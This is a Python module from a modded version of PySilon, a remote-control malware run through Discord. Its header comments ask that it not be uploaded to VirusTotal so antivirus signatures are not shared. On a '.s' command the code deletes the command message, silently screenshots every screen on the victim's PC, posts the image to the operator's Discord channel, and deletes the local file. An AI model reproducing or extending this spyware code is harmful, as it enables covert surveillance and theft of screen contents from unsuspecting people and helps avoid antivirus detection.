#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS
#PLEASE DO NOT ADD PAYLOAD ON VIRUSTOTAL ( it shares signatures with other av companies )


from resources.misc import *
from PIL import ImageGrab
import subprocess
# end of imports

# on message
elif message.content == '.s':
    #.log Message is "take screenshot"
    await message.delete()
    #.log Removed the message
    ImageGrab.grab(all_screens=True).save(f'C:\\Users\\{getuser()}\\{software_directory_name}\\s.png')
    #.log Saved a screenshot of this PCs screen
    reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On dmnd]`', color=0x0084ff).set_image(url='attachment://s.png'), file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\s.png'))
    #.log Sent embed containing screenshot
    await reaction_msg.add_reaction('📌')
    #.log Reacted with "pin"

    subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\s.png', shell=True)
    #.log Removed the screenshot
    
#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS
#PLEASE DO NOT ADD PAYLOAD ON VIRUSTOTAL ( it shares signatures with other av companies )
